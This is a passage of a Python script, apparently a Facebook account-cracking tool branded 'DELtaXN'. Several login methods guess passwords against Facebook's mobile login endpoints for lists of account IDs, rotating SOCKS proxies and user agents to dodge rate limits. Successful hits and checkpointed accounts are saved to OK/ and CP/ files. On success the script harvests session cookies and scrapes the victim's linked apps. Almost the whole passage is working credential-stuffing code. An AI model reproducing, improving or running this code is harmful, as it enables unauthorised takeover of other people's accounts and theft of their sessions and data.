			p = ses.get(f'https://free.prod.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid": idf,"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified","flow": "login_no_pin","pass": pw}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.600000023841858; wd=450x917'
			heade={'Host': 'free.prod.facebook.com','content-length': f"{len(str(dataa))}",'cache-control': 'max-age=0','dpr': '1.600000023841858','viewport-width': '980','sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '''Android''','sec-ch-ua-platform-version': '''11.0.0''','sec-ch-ua-full-version-list': '"Not;A=Brand";v="8.0.0.0", "Chromium";v="120.0.6099.43", "Google Chrome";v="120.0.6099.43"','sec-ch-prefers-color-scheme': 'light','save-data': 'on','origin': 'https://free.prod.facebook.com','dnt': '1','upgrade-insecure-requests': '1','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': f'https://free.prod.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				prints(panel(f"[bold yellow]ID : {idf} \nPASSWORD : {pw} \nUA : {ua}",title=f"[bold yellow][ DELtaXN CP ]",style=f"bold yellow"))
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				prints(panel(f"[bold green]ID : {idf} \nPASSWORD : {pw} \nUA : {ua} \nCOOKIES : {kuki}",title=f"[bold green][ DELtaXN OK ]",style=f"bold green"))
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METHODE 3 ]--------------------#
def iwan(idf,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randint
	cici = rc([f'{m}DELtaXN3',f'{k}DELtaXN3',f'{h}DELtaXN3'])
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ses = requests.Session()
	prog.update(des,description=f"{cici}[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			p = ses.get(f'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=630498417018811&kid_directed_site=0&app_id=630498417018811&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D630498417018811%26cbt%3D1708474492547%26e2e%3D%257B%2522init%2522%253A1708474492548%257D%26ies%3D1%26sdk%3Dandroid-15.2.0%26sso%3Dchrome_custom_tab%26nonce%3D2be15c95-9e60-4638-97e7-12c751619615%26scope%3Dopenid%252Cpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b90a2223-9b42-4e49-89a3-d6efb8223b7a%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522aqc6m5k0g8u2ivoaab9g%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.naver.linewebtoon%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DMzWAhL6b_aTXOGRL0HQ1XrhflHMWTkWyGL7HALx1A1Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db90a2223-9b42-4e49-89a3-d6efb8223b7a%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.naver.linewebtoon%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b90a2223-9b42-4e49-89a3-d6efb8223b7a%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522aqc6m5k0g8u2ivoaab9g%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"m_ts": re.search('name="m_ts" value="(.*?)"', str(p.text)).group(1),"li": re.search('name="li" value="(.*?)"', str(p.text)).group(1),"try_number": "0","unrecognized_tries": "0","email": idf,"prefill_contact_point": idf,"prefill_source": "browser_dropdown","prefill_type": "password","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": "true","had_password_prefilled": "true","is_smart_lock": "false","bi_xrwh": "0","bi_wvdp": str('{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}'),"encpass": "#PWD_BROWSER:5:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),pw),"fb_dtsg": "","jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),"__dyn": "","__csr": "","__req": "5","__a": "","__user": "0"}
			koki = ("; ").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			heade={'Host': 'm.prod.facebook.com','content-length': "2124",'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"','sec-ch-ua-mobile': '?1','user-agent': ua,'viewport-width': '450','content-type': 'application/x-www-form-urlencoded','x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),'sec-ch-ua-platform-version': '''11.0.0''','x-asbd-id': '129477','dpr': '1.6','sec-ch-ua-full-version-list': '"Not;A=Brand";v="8.0.0.0", "Chromium";v="120.0.6099.43", "Google Chrome";v="120.0.6099.43"','save-data': 'on','sec-ch-prefers-color-scheme': 'light','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.prod.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=630498417018811&kid_directed_site=0&app_id=630498417018811&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D630498417018811%26cbt%3D1708474492547%26e2e%3D%257B%2522init%2522%253A1708474492548%257D%26ies%3D1%26sdk%3Dandroid-15.2.0%26sso%3Dchrome_custom_tab%26nonce%3D2be15c95-9e60-4638-97e7-12c751619615%26scope%3Dopenid%252Cpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b90a2223-9b42-4e49-89a3-d6efb8223b7a%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522aqc6m5k0g8u2ivoaab9g%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.naver.linewebtoon%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DMzWAhL6b_aTXOGRL0HQ1XrhflHMWTkWyGL7HALx1A1Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db90a2223-9b42-4e49-89a3-d6efb8223b7a%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.naver.linewebtoon%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b90a2223-9b42-4e49-89a3-d6efb8223b7a%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522aqc6m5k0g8u2ivoaab9g%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.prod.facebook.com/login/device-based/login/async/?api_key=630498417018811&auth_token=d18c85821e1d149c7566b317c26491a3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D630498417018811%26cbt%3D1708474492547%26e2e%3D%257B%2522init%2522%253A1708474492548%257D%26ies%3D1%26sdk%3Dandroid-15.2.0%26sso%3Dchrome_custom_tab%26nonce%3D2be15c95-9e60-4638-97e7-12c751619615%26scope%3Dopenid%252Cpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b90a2223-9b42-4e49-89a3-d6efb8223b7a%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522aqc6m5k0g8u2ivoaab9g%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.naver.linewebtoon%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DMzWAhL6b_aTXOGRL0HQ1XrhflHMWTkWyGL7HALx1A1Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db90a2223-9b42-4e49-89a3-d6efb8223b7a%26tp%3Dunspecified&refsrc=deprecated&app_id=630498417018811&cancel=fbconnect%3A%2F%2Fcct.com.naver.linewebtoon%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b90a2223-9b42-4e49-89a3-d6efb8223b7a%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522aqc6m5k0g8u2ivoaab9g%2522%257D&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				prints(panel(f"[bold yellow]ID : {idf} \nPASSWORD : {pw} \nUA : {ua}",title=f"[bold yellow][ DELtaXN CP ]",style=f"bold yellow"))
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				prints(panel(f"[bold green]ID : {idf} \nPASSWORD : {pw} \nUA : {ua} \nCOOKIES : {kuki}",title=f"[bold green][ DELtaXN OK ]",style=f"bold green"))
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1	

#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print("[bold white]"+cek[opsi]))
	except:pass
	if len(ops)==0:pass
	print (' >>> Columns(ops)')
#------------------[ SYSTEM CONTROL ]---------------#                      
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login3()